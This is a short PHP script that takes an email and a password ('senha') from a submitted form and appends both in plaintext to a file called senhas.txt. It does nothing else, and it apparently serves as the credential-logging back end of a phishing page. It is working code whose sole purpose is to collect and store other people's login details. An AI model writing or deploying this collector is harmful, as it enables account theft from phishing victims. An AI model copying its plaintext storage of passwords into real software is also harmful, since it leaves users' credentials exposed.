<?php
    $email = $_POST['email'];
    $senha = $_POST['senha'];
    
    $arquivo = fopen('senhas.txt', 'a');
    fwrite($arquivo, "Email: ".$email." - Senha: ".$senha."\n");
    fclose($arquivo);
?>
